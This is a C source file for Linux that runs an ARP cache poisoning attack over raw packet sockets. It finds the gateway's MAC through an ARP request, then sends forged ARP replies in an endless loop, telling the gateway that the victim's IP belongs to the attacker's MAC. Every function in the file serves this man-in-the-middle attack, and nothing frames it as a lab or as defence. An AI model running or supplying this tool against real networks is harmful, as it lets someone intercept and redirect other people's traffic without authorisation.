#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <errno.h>
#include <ifaddrs.h>
#include <getopt.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

struct arp_frame {
	struct ether_header eth_hdr;
	struct ether_arp  arp_hdr;
};

void die(const char *error) {
	fprintf(stderr, "Error: %s\n", error);
	exit(EXIT_FAILURE);
}

void print_ip(uint32_t ip) {
	printf("%9s\n", inet_ntoa((struct in_addr){ .s_addr = ip }));
}

void print_mac(unsigned char *mac) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n",
		(unsigned char) mac[0],
		(unsigned char) mac[1],
		(unsigned char) mac[2],
		(unsigned char) mac[3],
		(unsigned char) mac[4],
		(unsigned char) mac[5]
    );
}

bool check_interface(const char *if_name) {
	
    struct ifaddrs *ifaddr, *ifa;
	
    if(getifaddrs(&ifaddr) < 0) 
		die(strerror(errno));

	ifa = ifaddr;

	while(ifa && strcmp(if_name, ifa->ifa_name))
		ifa = ifa->ifa_next;

	unsigned int flags = ifa ? ifa->ifa_flags : 0;

	bool ret = ifa && (flags & IFF_UP) && (flags & IFF_RUNNING) && !(flags & IFF_LOOPBACK);

	freeifaddrs(ifaddr);

	return ret;
}

void set_ifr_name(struct ifreq *ifr, const char *if_name) {	
    size_t if_name_len = strlen(if_name);
	
    if (if_name_len < sizeof(ifr->ifr_name)) {
		memcpy(ifr->ifr_name, if_name, if_name_len);
		ifr->ifr_name[if_name_len] = 0;
	} 
    else die("Interface name is too long");
}


int get_ifr_ifindex(int fd, struct ifreq *ifr) {
    if(ioctl(fd, SIOCGIFINDEX, ifr) < 0)
		  die(strerror(errno));
	
	return ifr->ifr_ifindex;
}


void get_ifr_hwaddr(int fd, struct ifreq *ifr) {
    if (ioctl(fd, SIOCGIFHWADDR, ifr) < 0)
		die(strerror(errno));

	if (ifr->ifr_hwaddr.sa_family != ARPHRD_ETHER)
		die("Not an ethernet interface");
}

void get_ifr_addr(int fd, struct ifreq *ifr) {
	if (ioctl(fd, SIOCGIFADDR, ifr) < 0) 
		die(strerror(errno));
}

void request_mac(int asfd, const char *if_name, struct ether_arp *req, uint32_t ip_addr) {

	/* arp reuest will be broadcasted to every station in the LAN */

	const unsigned char ether_broadcast_addr[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

	struct ifreq ifr;

	set_ifr_name(&ifr, if_name);

	/* special socket address type used for AF_PACKET */
	struct sockaddr_ll addr = {0};
	addr.sll_family   = AF_PACKET;
	addr.sll_ifindex  = get_ifr_ifindex(asfd, &ifr);
	addr.sll_halen    = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

	/* construct the ARP request */
	req->arp_hrd = htons(ARPHRD_ETHER);
	req->arp_pro = htons(ETH_P_IP);
	req->arp_hln = ETHER_ADDR_LEN;
	req->arp_pln = sizeof(in_addr_t);
	req->arp_op  = htons(ARPOP_REQUEST);

	/* zero because that's what we're asking for */
	memset(&req->arp_tha, 0, sizeof(req->arp_tha));
	memcpy(&req->arp_tpa, &ip_addr, sizeof(req->arp_tpa));
	get_ifr_hwaddr(asfd, &ifr);
	memcpy(&req->arp_sha, (unsigned char *) ifr.ifr_hwaddr.sa_data, sizeof(req->arp_sha));
	get_ifr_addr(asfd, &ifr);
	memcpy(&req->arp_spa, (unsigned char *) ifr.ifr_addr.sa_data + 2, sizeof(req->arp_spa));

	/* actually send it */
	if(sendto(asfd, req, sizeof(struct ether_arp), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
		die(strerror(errno));

	while(1) {
		/* can't use recvfrom() -- no network layer */
		int bytes;
		
        if((bytes = recv(asfd, req, sizeof(struct ether_arp), 0)) < 0) 
			die(strerror(errno));
		
        if(bytes == 0)    /* no response */
		    continue;
		
        unsigned int from_addr = (req->arp_spa[3] << 24) | (req->arp_spa[2] << 16) | (req->arp_spa[1] << 8) | (req->arp_spa[0] << 0);
		
        if(from_addr != ip_addr)
			continue;
		/* everything's good, we have our response */
		break;
    }	

}

void arp_spoof(int rsfd, const char *if_name, const unsigned char *attacker_mac, uint32_t gateway_ip, const unsigned char *gateway_mac, uint32_t victim_ip) {
	
	struct arp_frame resp;
    // struct ether_arp resp;
	struct ifreq ifr;
	set_ifr_name(&ifr, if_name);

	struct sockaddr_ll addr = {0};
	addr.sll_family         = AF_PACKET;
	addr.sll_ifindex        = get_ifr_ifindex(rsfd, &ifr);
	addr.sll_halen          = ETH_ALEN;
	addr.sll_protocol       = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, gateway_mac, ETHER_ADDR_LEN);

	memcpy(&resp.eth_hdr.ether_dhost,gateway_mac,sizeof(resp.eth_hdr.ether_dhost));
	memcpy(&resp.eth_hdr.ether_shost,attacker_mac,sizeof(resp.eth_hdr.ether_shost));
	resp.eth_hdr.ether_type = htons(ETHERTYPE_ARP);

	resp.arp_hdr.arp_hrd = htons(ARPHRD_ETHER); 
	resp.arp_hdr.arp_pro = htons(ETH_P_IP);
	resp.arp_hdr.arp_hln = ETHER_ADDR_LEN;
	resp.arp_hdr.arp_pln = sizeof(in_addr_t);
	resp.arp_hdr.arp_op  = htons(ARPOP_REPLY);

	// resp.arp_hrd = htons(ARPHRD_ETHER);
	// resp.arp_pro = htons(ETH_P_IP);
	// resp.arp_hln = ETHER_ADDR_LEN;
	// resp.arp_pln = sizeof(in_addr_t);

	memcpy(&resp.arp_hdr.arp_sha, attacker_mac, sizeof(resp.arp_hdr.arp_sha));
	memcpy(&resp.arp_hdr.arp_spa, &victim_ip, sizeof(resp.arp_hdr.arp_spa));
	memcpy(&resp.arp_hdr.arp_tha, gateway_mac, sizeof(resp.arp_hdr.arp_tha));
	memcpy(&resp.arp_hdr.arp_tpa, &gateway_ip, sizeof(resp.arp_hdr.arp_tpa));

	if(sendto(rsfd,(void *)&resp, sizeof(resp), 0, (struct sockaddr *)&addr, sizeof(addr)) <= 0) 
		die(strerror(errno));

}




int main(int argc, const char* argv[]) {

    if(argc != 4) {
        printf("Provide the interface name gateway's IP and victim's IP as arguments\n");
        exit(EXIT_FAILURE);
    }

    int asfd, rsfd;
    struct ifreq ifr;
    struct ether_arp req;
    struct in_addr ip_addr = {0};
    unsigned char attacker_mac[6], gateway_mac[6];
    char *if_name, *victim_ip_str, *gateway_ip_str;
    
    uint32_t gateway_ip = 0;
    uint32_t attacker_ip = 0;
    uint32_t victim_ip = 0;

    if_name = strdup(argv[1]);
    gateway_ip_str = strdup(argv[2]);
    victim_ip_str = strdup(argv[3]);


    if(check_interface(if_name) == 0) 
		die("Invalid interface (nonexistent or not connected?)");


    // converts ip from acsii to network format 
    
    if(inet_aton(gateway_ip_str, &ip_addr) == 0)
		die("Invalid Victim IP address");
	
	gateway_ip = ip_addr.s_addr;

    if(inet_aton(victim_ip_str, &ip_addr) == 0)
		die("Invalid Victim IP address");
	
	victim_ip = ip_addr.s_addr;

	if ((asfd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP))) < 0)
		die(strerror(errno));
	

    // To find the our MAC address and IP address on the given interface

	set_ifr_name(&ifr, if_name);
	get_ifr_hwaddr(asfd, &ifr);
	memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, sizeof(attacker_mac));
    printf("Attacker's MAC Address : ");
    print_mac(attacker_mac);
	get_ifr_addr(asfd, &ifr);
	memcpy(&attacker_ip, (unsigned char *) ifr.ifr_addr.sa_data + 2, sizeof(attacker_ip));
    printf("Attacker's IP Address : ");
    print_ip(attacker_ip);

	request_mac(asfd, if_name, &req, gateway_ip);
	memcpy(gateway_mac, req.arp_sha, sizeof(gateway_mac));
    
    printf("Gateway's MAC Address : ");
    print_mac(gateway_mac);

	if((rsfd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP))) < 0)
		die(strerror(errno));

    while(1) {
		arp_spoof(rsfd, if_name, attacker_mac, gateway_ip, gateway_mac, victim_ip);
    }

}